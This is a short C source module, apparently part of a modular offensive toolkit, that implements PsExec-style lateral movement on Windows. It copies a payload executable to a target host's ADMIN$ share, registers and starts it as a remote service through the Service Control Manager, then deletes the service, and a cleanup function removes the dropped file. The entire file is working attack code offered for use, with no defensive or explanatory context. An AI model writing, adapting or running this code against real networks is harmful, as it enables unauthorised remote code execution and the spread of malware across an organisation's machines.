// chunk: lateral/psexec_manual
// depends: (none)
// provides: lateral_psexec
// headers: windows.h
// note: PsExec-style lateral movement via SCM

#ifndef CHUNK_LATERAL_PSEXEC_MANUAL
#define CHUNK_LATERAL_PSEXEC_MANUAL

static int lateral_psexec(const char *target_host, const char *payload_path,
                          const char *service_name) {
    char remote_path[512];
    snprintf(remote_path, sizeof(remote_path), "\\\\%s\\ADMIN$\\%s.exe",
             target_host, service_name);

    if (!CopyFileA(payload_path, remote_path, FALSE)) {
        return 0;
    }

    SC_HANDLE hSCM = OpenSCManagerA(target_host, NULL,
                                     SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!hSCM) {
        DeleteFileA(remote_path);
        return 0;
    }

    char svc_path[512];
    snprintf(svc_path, sizeof(svc_path), "%%SystemRoot%%\\%s.exe", service_name);

    SC_HANDLE hSvc = CreateServiceA(
        hSCM,
        service_name,
        service_name,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        svc_path,
        NULL, NULL, NULL, NULL, NULL
    );

    int result = 0;
    if (hSvc) {
        if (StartServiceA(hSvc, 0, NULL)) {
            result = 1;
        }
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
    }

    CloseServiceHandle(hSCM);
    return result;
}

static int lateral_psexec_cleanup(const char *target_host, const char *service_name) {
    char remote_path[512];
    snprintf(remote_path, sizeof(remote_path), "\\\\%s\\ADMIN$\\%s.exe",
             target_host, service_name);
    DeleteFileA(remote_path);
    return 1;
}

#endif
